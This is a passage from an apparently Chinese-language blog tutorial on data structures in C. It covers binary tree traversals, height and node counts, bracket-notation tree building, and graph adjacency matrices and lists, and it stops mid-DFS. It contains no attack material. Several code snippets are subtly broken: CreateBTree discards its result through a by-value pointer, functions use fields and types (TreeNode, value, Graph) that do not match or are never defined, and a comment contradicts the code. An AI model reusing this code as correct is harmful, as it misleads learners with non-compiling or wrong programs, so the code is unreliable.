class="hljs-string">&quot;%d &quot;</span>, root-&gt;data);<br>    PreorderTraversal(root-&gt;left);<br>    PreorderTraversal(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">// 中序遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InorderTraversal</span><span class="hljs-params">(TreeNode *root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    InorderTraversal(root-&gt;left);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, root-&gt;data);<br>    InorderTraversal(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">// 后序遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PostorderTraversal</span><span class="hljs-params">(TreeNode *root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    PostorderTraversal(root-&gt;left);<br>    PostorderTraversal(root-&gt;right);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, root-&gt;data);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getHeight</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 空树的高度为 0</span><br>    &#125;<br>    <span class="hljs-type">int</span> leftHeight = getHeight(root-&gt;left);  <span class="hljs-comment">// 左子树高度</span><br>    <span class="hljs-type">int</span> rightHeight = getHeight(root-&gt;right); <span class="hljs-comment">// 右子树高度</span><br>    <span class="hljs-keyword">return</span> (leftHeight &gt; rightHeight ? leftHeight : rightHeight) + <span class="hljs-number">1</span>; <span class="hljs-comment">// 取较大值加 1</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getNodeCount</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 空树的节点数为 0</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> getNodeCount(root-&gt;left) + getNodeCount(root-&gt;right) + <span class="hljs-number">1</span>; <span class="hljs-comment">// 左子树节点数 + 右子树节点数 + 根节点</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getLeafNodeCount</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 空树的叶子节点数为 0</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// 当前节点是叶子节点</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> getLeafNodeCount(root-&gt;left) + getLeafNodeCount(root-&gt;right); <span class="hljs-comment">// 左子树叶子节点数 + 右子树叶子节点数</span><br>&#125;<br><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    TreeNode *root = <span class="hljs-literal">NULL</span>;<br>    root = Insert(root, <span class="hljs-number">5</span>);<br>    root = Insert(root, <span class="hljs-number">3</span>);<br>    root = Insert(root, <span class="hljs-number">7</span>);<br>    root = Insert(root, <span class="hljs-number">2</span>);<br>    root = Insert(root, <span class="hljs-number">4</span>);<br>    root = Insert(root, <span class="hljs-number">6</span>);<br>    root = Insert(root, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;前序遍历: &quot;</span>);<br>    PreorderTraversal(root);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;中序遍历: &quot;</span>);<br>    InorderTraversal(root);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;后序遍历: &quot;</span>);<br>    PostorderTraversal(root);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h3><ol><li><strong>节点定义</strong>：<ul><li>使用结构体 <code>TreeNode</code> 来定义二叉树的节点，每个节点包含一个 <code>data</code> 数据域，以及指向左、右子节点的指针。</li></ul></li><li><strong>创建节点</strong>：<ul><li>使用 <code>CreateNode(int value)</code> 函数来创建一个新节点。</li></ul></li><li><strong>插入节点</strong>：<ul><li>使用 <code>Insert(TreeNode *root, int value)</code> 函数来向二叉树中插入节点。插入节点的规则是：左子节点小于父节点，右子节点大于父节点。</li></ul></li><li><strong>遍历操作</strong>：<ul><li><strong>前序遍历</strong>：先访问根节点，再访问左子树，最后访问右子树。</li><li><strong>中序遍历</strong>：先访问左子树，再访问根节点，最后访问右子树。</li><li><strong>后序遍历</strong>：先访问左子树，再访问右子树，最后访问根节点。</li></ul></li></ol><p>对应算法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 50  <span class="hljs-comment">// 栈的最大容量</span></span><br><br><span class="hljs-comment">// 定义二叉树节点结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span> &#123;</span><br>    <span class="hljs-type">char</span> data;              <span class="hljs-comment">// 节点数据</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span>* <span class="hljs-title">lchild</span>;</span>  <span class="hljs-comment">// 左子节点</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span>* <span class="hljs-title">rchild</span>;</span>  <span class="hljs-comment">// 右子节点</span><br>&#125; BTNode;<br><br><span class="hljs-comment">// 函数：根据括号表示法建立二叉树</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreateBTree</span><span class="hljs-params">(BTNode* bt, <span class="hljs-type">char</span>* str)</span> &#123;<br>    BTNode* St[MaxSize], *p = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 定义栈和当前处理的节点</span><br>    <span class="hljs-type">int</span> top = <span class="hljs-number">-1</span>, k = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;     <span class="hljs-comment">// 栈顶指针，k表示左/右子树标志，j遍历字符串索引</span><br>    <span class="hljs-type">char</span> ch;<br>    bt = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 初始化树根为空</span><br>    ch = str[j];<br>    <span class="hljs-keyword">while</span> (ch != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;  <span class="hljs-comment">// 遍历输入字符串</span><br>        <span class="hljs-keyword">switch</span> (ch) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;(&#x27;</span>:<br>                top++;<br>                St[top] = p;  <span class="hljs-comment">// 将当前节点入栈</span><br>                k = <span class="hljs-number">1</span>;        <span class="hljs-comment">// 下一个节点为左子节点</span><br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;)&#x27;</span>:<br>                top--;  <span class="hljs-comment">// 子树处理完毕，出栈</span><br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;,&#x27;</span>:<br>                k = <span class="hljs-number">2</span>;  <span class="hljs-comment">// 下一个节点为右子节点</span><br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                p = (BTNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BTNode));  <span class="hljs-comment">// 创建新节点</span><br>                p-&gt;data = ch;<br>                p-&gt;lchild = p-&gt;rchild = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 初始化左右子树为空</span><br>                <span class="hljs-keyword">if</span> (bt == <span class="hljs-literal">NULL</span>) &#123;  <span class="hljs-comment">// 如果树根为空，说明当前节点是根节点</span><br>                    bt = p;<br>                &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 否则，连接左右子树</span><br>                    <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) &#123;<br>                        St[top]-&gt;lchild = p;  <span class="hljs-comment">// 左子树</span><br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (k == <span class="hljs-number">2</span>) &#123;<br>                        St[top]-&gt;rchild = p;  <span class="hljs-comment">// 右子树</span><br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>        j++;  <span class="hljs-comment">// 移动到下一个字符</span><br>        ch = str[j];<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 求树的高度</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">tree_height</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 空树高度为0</span><br>    &#125;<br>    <span class="hljs-type">int</span> left_height = tree_height(root-&gt;left);<br>    <span class="hljs-type">int</span> right_height = tree_height(root-&gt;right);<br>    <span class="hljs-keyword">return</span> (left_height &gt; right_height) ? (left_height +<span class="hljs-number">1</span>) : (right_height + <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// 求树的节点个数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">count_nodes</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 空树没有节点</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> count_nodes(root-&gt;left) + count_nodes(root-&gt;right) + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 求树的叶子节点个数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">count_leaves</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 空树没有叶子</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// 叶子节点</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> count_leaves(root-&gt;left) + count_leaves(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">// 以括号的形式输出二叉树</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_tree</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, root-&gt;value);  <span class="hljs-comment">// 打印根节点</span><br>    <span class="hljs-keyword">if</span> (root-&gt;left || root-&gt;right) &#123;  <span class="hljs-comment">// 如果有子节点</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(&quot;</span>);<br>        print_tree(root-&gt;left);  <span class="hljs-comment">// 打印左子树</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;,&quot;</span>);<br>        print_tree(root-&gt;right); <span class="hljs-comment">// 打印右子树</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;)&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="二叉树的种类"><a href="#二叉树的种类" class="headerlink" title="二叉树的种类"></a>二叉树的种类</h3><ul><li><strong>二叉查找树（BST）</strong>：左子树节点值小于根节点，右子树节点值大于根节点，且左右子树分别也是二叉查找树。</li><li><strong>平衡二叉树（AVL树）</strong>：任意节点的左右子树高度差不超过1，保证二叉查找树的平衡性，从而提高查找效率。</li><li><strong>完全二叉树</strong>：除最后一层外，其他层节点都达到最大数目，且最后一层的节点从左向右连续排列。</li><li><strong>满二叉树</strong>：所有的非叶节点都有两个子节点，且所有叶节点在同一层。</li></ul><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li><strong>表达式解析</strong>：二叉树可用于表达式的解析和计算，如中缀表达式、前缀表达式、后缀表达式的解析。</li><li><strong>查找和排序</strong>：二叉查找树适合快速查找数据。</li><li><strong>数据存储</strong>：在数据库的索引、文件系统的目录结构中，二叉树是常见的存储结构。</li></ul><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><ol><li><strong>顶点（Vertex）</strong>：图中的节点。</li><li><strong>边（Edge）</strong>：连接两个顶点的线段，表示两个顶点之间的关系。</li><li><strong>有向图（Directed Graph）</strong>：图中的边是有方向的。</li><li><strong>无向图（Undirected Graph）</strong>：图中的边是无方向的。</li><li><strong>邻接</strong>：如果两个顶点之间有一条边连接，则称它们是相邻的。</li><li><strong>邻接矩阵（Adjacency Matrix）</strong>：使用矩阵表示图。</li><li><strong>邻接表（Adjacency List）</strong>：使用链表表示图。</li></ol><p>在C语言中，通常使用<strong>邻接矩阵</strong>和<strong>邻接表</strong>来表示图结构。</p><h3 id="图的表示方法"><a href="#图的表示方法" class="headerlink" title="图的表示方法"></a>图的表示方法</h3><h4 id="1-邻接矩阵表示法"><a href="#1-邻接矩阵表示法" class="headerlink" title="1. 邻接矩阵表示法"></a>1. 邻接矩阵表示法</h4><p>邻接矩阵是一种二维数组，矩阵中的元素表示顶点之间是否有边。对于一个包含 <code>n</code> 个顶点的图，我们可以使用一个 <code>n × n</code> 的二维数组来表示：</p><ul><li>如果有边 <code>i -&gt; j</code>，则 <code>adj[i][j] = 1</code>（或权重）。</li><li>如果没有边 <code>i -&gt; j</code>，则 <code>adj[i][j] = 0</code>。</li></ul><p>邻接矩阵适用于边数比较多的<strong>稠密图</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INF 9999  <span class="hljs-comment">// 表示无穷大，用于带权图中无连接的情况</span></span><br><br><span class="hljs-type">int</span> adjMatrix[MAX_VERTICES][MAX_VERTICES];<br><br><span class="hljs-comment">// 初始化邻接矩阵</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">initAdjMatrix</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            adjMatrix[i][j] = (i == j) ? <span class="hljs-number">0</span> : INF; <span class="hljs-comment">// 无权无连接的边设为 0，其他边为 INF</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 添加边（无向图）</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addEdge</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> v, <span class="hljs-type">int</span> weight)</span> </span>&#123;<br>    adjMatrix[u][v] = weight;<br>    adjMatrix[v][u] = weight; <span class="hljs-comment">// 对称添加，表示无向边</span><br>&#125;<br><br><br><span class="hljs-comment">// 添加边</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddEdge</span><span class="hljs-params">(Graph *g, <span class="hljs-type">int</span> src, <span class="hljs-type">int</span> dest)</span> </span>&#123;<br>    g-&gt;adjMatrix[src][dest] = <span class="hljs-number">1</span>; <span class="hljs-comment">// 对于无向图，两端都需标记为1</span><br>    g-&gt;adjMatrix[dest][src] = <span class="hljs-number">1</span>; <span class="hljs-comment">// 如果是有向图，只需标记一处即可</span><br>&#125;<br><br><span class="hljs-comment">// 打印邻接矩阵</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintGraph</span><span class="hljs-params">(Graph *g)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;邻接矩阵:\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;numVertices; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; g-&gt;numVertices; j++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, g-&gt;adjMatrix[i][j]);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Graph g;<br>    <span class="hljs-built_in">InitGraph</span>(&amp;g, <span class="hljs-number">5</span>); <span class="hljs-comment">// 初始化5个顶点的图</span><br><br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>);<br><br>    <span class="hljs-built_in">PrintGraph</span>(&amp;g);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="2-邻接表表示法"><a href="#2-邻接表表示法" class="headerlink" title="2. 邻接表表示法"></a>2. 邻接表表示法</h4><p>邻接表使用<strong>链表数组</strong>来表示图，每个顶点有一个链表，该链表中存储与该顶点相邻的所有顶点。邻接表适用于边数较少的<strong>稀疏图</strong>，可以节省内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><br><span class="hljs-comment">// 定义邻接表的链表节点</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">AdjListNode</span> &#123;<br>    <span class="hljs-type">int</span> vertex; <span class="hljs-comment">// 邻接顶点的编号</span><br>    <span class="hljs-type">int</span> weight; <span class="hljs-comment">// 权值（对于带权图）</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">AdjListNode</span>* next;<br>&#125; AdjListNode;<br><br><span class="hljs-comment">// 定义邻接表</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    AdjListNode* head; <span class="hljs-comment">// 指向链表头节点</span><br>&#125; AdjList;<br><br><span class="hljs-comment">// 定义图结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> numVertices;       <span class="hljs-comment">// 顶点数量</span><br>    AdjList adjLists[MAX_VERTICES]; <span class="hljs-comment">// 顶点的邻接表数组</span><br>&#125; Graph;<br><br><span class="hljs-comment">// 创建一个新的邻接表节点</span><br><span class="hljs-function">AdjListNode* <span class="hljs-title">createNode</span><span class="hljs-params">(<span class="hljs-type">int</span> vertex, <span class="hljs-type">int</span> weight)</span> </span>&#123;<br>    AdjListNode* newNode = (AdjListNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(AdjListNode));<br>    newNode-&gt;vertex = vertex;<br>    newNode-&gt;weight = weight;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br><br><span class="hljs-comment">// 初始化图</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">initGraph</span><span class="hljs-params">(Graph* graph, <span class="hljs-type">int</span> numVertices)</span> </span>&#123;<br>    graph-&gt;numVertices = numVertices;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        graph-&gt;adjLists[i].head = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 添加边（无向图）</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addEdge</span><span class="hljs-params">(Graph* graph, <span class="hljs-type">int</span> src, <span class="hljs-type">int</span> dest, <span class="hljs-type">int</span> weight)</span> </span>&#123;<br>    AdjListNode* newNode = <span class="hljs-built_in">createNode</span>(dest, weight);<br>    newNode-&gt;next = graph-&gt;adjLists[src].head;<br>    graph-&gt;adjLists[src].head = newNode;<br><br>    <span class="hljs-comment">// 对于无向图，还需要在 dest -&gt; src 添加一条边</span><br>    newNode = <span class="hljs-built_in">createNode</span>(src, weight);<br>    newNode-&gt;next = graph-&gt;adjLists[dest].head;<br>    graph-&gt;adjLists[dest].head = newNode;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="图的常见操作"><a href="#图的常见操作" class="headerlink" title="图的常见操作"></a>图的常见操作</h3><ol><li><strong>遍历（Traversal）</strong>：<ul><li><strong>深度优先遍历（DFS）</strong>：从某个顶点开始尽可能深地访问图中的节点。</li><li><strong>广度优先遍历（BFS）</strong>：从某个顶点开始，逐层访问图中的节点。</li></ul></li><li><strong>最短路径</strong>：<ul><li><strong>Dijkstra算法</strong>：用于求解有向图中单源最短路径。</li><li><strong>Floyd算法</strong>：用于求解任意两点之间的最短路径。</li></ul></li><li><strong>连通性</strong>：<ul><li>判断图是否是连通图。</li><li>求连通分量。</li></ul></li><li><strong>最小生成树（MST）</strong>：<ul><li><strong>Prim算法</strong>：构建最小生成树。</li><li><strong>Kruskal算法</strong>：构建最小生成树</li></ul></li></ol><p>深度优先遍历（DFS）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 深度优先搜索（DFS）递归版本</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DFS</span><span class="hljs-params">(Graph* graph, <span class="hljs-type">int</span> vertex, <span 